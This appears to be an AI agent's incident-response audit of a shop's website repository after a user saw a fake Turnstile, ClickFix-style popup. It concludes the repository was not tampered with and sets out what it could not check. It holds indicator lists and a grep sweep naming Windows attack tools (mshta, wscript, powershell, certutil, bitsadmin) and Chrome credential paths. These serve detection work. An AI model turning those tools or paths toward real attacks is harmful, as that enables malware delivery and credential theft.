**The repository WAS NOT tampered with.**

Evidence:

1. **Full history scanned, not just the tip.** The clone was shallow, so `git fetch --unshallow origin` was run first; the repository has exactly **4 pre-existing commits** (`06695f7`, `37a1a5b`, `6012440`, `2ebbd9f`) and `git grep` over **every blob of every commit** returned **zero** hits for all Windows/ClickFix indicators (`wscript`, `cscript`, `mshta`, `cmd /d`, `powershell`, `%LOCALAPPDATA%`, `Chrome\User Data`, `rt.vbs`, `218624`, `certutil`, `bitsadmin`, `schtasks`, `regsvr32`, `Win + R`, `Ctrl + V`, `Ref ID`, `DQPF-ULGK`, `verify you are human`) and zero for the browser-injection set (`eval(` as a call, `document.write`, `atob(`, `importScripts`, `sendBeacon`, `WebSocket`, `EventSource`, `serviceWorker`). Zero base64 blobs longer than 200 characters in `index.html` in **all four** commits.
2. **No payload file has ever been committed.** `git log --all --diff-filter=A` over the whole history shows no `.vbs/.vbe/.hta/.ps1/.bat/.cmd/.scr/.lnk/.jse/.wsf/.exe/.dll/.msi/.sh/.reg` file at any point; the extension histogram is jpg/webp/json/csv/sql/py/md/ts/png/js/svg/xml/webmanifest/txt/html only. Every binary file's magic bytes match its extension (0 mismatches) and no image contains script/WSH markers.
3. **Only known identities, and no rewrite.** Authors: `Manesh Kumar <manesh844@users.noreply.github.com>` (×2, 2026-10-02), `Arena Agent <agent@arena.ai>` (×1, 2026-10-03), `Manesh844 <Harwanimayyan012@gmail.com>` (×1, the PR merge). Author ≠ committer only on the merge commit (`GitHub <noreply@github.com>`), which is how every GitHub PR merge looks. GitHub reports the repository as **public**, created 2026-10-02, last pushed **2026-10-03T00:35:07Z** — i.e. **nothing was pushed to this repository on 2026-10-28**, the day of the incident, until this audit's own three commits (19:32–19:43 UTC).
4. **The serving layer was never redirected anywhere.** No `middleware.js`, `_middleware.js`, `sw.js`, `service-worker.js`, `.htaccess`, `_redirects`, `_headers` or `netlify.toml` exists or has ever existed. Exactly one `vercel.json`, touched by 4 commits; before today it contained **no rewrites at all**, and every rewrite that exists now points at same-origin `/index.html`.
5. **The deployment is the owner's, and it is signed.** The Vercel project for this repo has exactly one deployment — production, from `2ebbd9f` on `main`, `githubCommitVerification: "verified"`, creator `manesh844 <harwanimayyan012@gmail.com>`. No attacker-created deployment, no preview pointing at a foreign commit. All 25 most recent account events were performed by that same owner account.
6. **The shipped page loads no foreign code.** The only `<script src>` in the pre-audit HTML was same-origin `catalog.js`; every `fetch()` target (12 call sites) is the owner's Supabase project or `api.brevo.com`. No supply chain exists at all: no `package.json`, no lockfile, no `node_modules`, no CI, no lifecycle script.
7. **`catalog.js` is bit-identical to what production was built from** — `sha256 0cb00161df55829ead321d8e633bed11c042ef1fd039c212c671d3912d9ef8df` both at `2ebbd9f` and in the working tree, so the 18 MB generated catalogue was never modified behind the build's back.

## 8. What I could NOT rule out

**Could a hacker have changed this code? On the evidence, no — not this repository.** Every commit, every blob, every binary file and the serving configuration were examined and none of them contain the popup, the command, or any mechanism that could produce them; the history is short, unbroken, signed and authored only by the owner and by Arena; nothing was pushed here on the day of the incident; and the deployed build matches a GitHub-verified commit from the owner's own account. The fake Turnstile you saw therefore did not come from *this* codebase.

**But there are three things I could not inspect, and you should not read this report as covering them:**

1. **`https://nukto.shop` is not built from this repository.** The Vercel project serving `nukto.shop` and `www.nukto.shop` is `realonenukto` (root directory `nukto-shop`, GitHub repo **`Manesh844/realonenukto`, private**), and its production deployment was promoted on **2026-10-26 20:29:25Z** — **two days before you saw the popup** — from branch `arena/9b44b2fa-realonenukto`, commit `f7b31097`, message *"Shift storefront palette to lemon and electric lavender"*. My GitHub token gets `403 Resource not accessible by integration` on that repository, and Vercel returns `404 File tree not found` for its deployed files, so **I could not scan a single byte of the code that actually serves the page where you saw the fake Turnstile.** That is the biggest gap in this audit. If the two codebases are siblings (they look like it), the changes in §3 must be **mirrored** into `nukto-shop/`: `vercel.json` (CSP + headers), `app.js` (externalised script + the three guards), `index.html` (bootstrap comments, `<script src="app.js">`), `tests/harness.js`. Run the same sweep there yourself — the commands below work in any checkout:

   ```bash
   git fetch --unshallow origin 2>/dev/null || true
   git log --all --format='%h | A:%an <%ae> | C:%cn <%ce> | %ad | %s' --date=iso-strict
   git log --all --diff-filter=A --name-only --format='' | sort -u | \
     grep -iE '\.(vbs|vbe|jse|wsf|wsh|hta|ps1|bat|cmd|scr|lnk|exe|dll|msi|com|pif)$'
   for c in $(git rev-list --all); do
     git grep -I -n -i -E 'wscript|cscript|mshta|cmd /d|powershell|LOCALAPPDATA|rt\.vbs|218624|Ref ID|Win ?\+ ?R|eval\(|atob\(|document\.write|importScripts|sendBeacon' $c -- '*.html' '*.js' '*.json' '*.ts'
   done
   grep -oiE '<script[^>]*src="[^"]*"' index.html | sort -u
   ```

2. **I could not compare the live page against the repository byte-for-byte.** This sandbox can only reach github.com, npmjs and pypi, so `curl https://nukto.shop` and `sha256sum` on the response were impossible, and Vercel's deployment-file API returns no tree for these deployments. Until you run §4a/§4b yourself, "what the browser receives" is unverified — a compromised CDN, DNS or a malicious **browser extension** rewriting the page in-flight would not show up in any repository scan, by definition.

3. **The machine and the browser profile were not examined.** The payload this command looks for is a file that is *already on disk* under `%LOCALAPPDATA%\Google\Chrome\User Data`. Nothing in a git repository can prove or disprove that. Given that the overlay appeared on top of the site's own cookie button, the most probable delivery vector is **not** the website at all — it is a **malicious or hijacked Chrome extension / adware injecting content into every page you visit**. The decisive test costs two minutes: open the shop in a **Chrome Guest window** (or a fresh Windows user profile) with extensions disabled. **If the fake Turnstile does not appear there, the code is innocent and the browser profile is infected** — go straight to §6 steps 4 and 5. If it *does* appear in Guest mode, re-run §4a against the live HTML and send me the output.

---

*Report generated 2026-10-28. Commits: `937cfc2` (CSP + headers), `5936098` (hardening), plus this document. Test suite: 417 passed / 0 failed.*
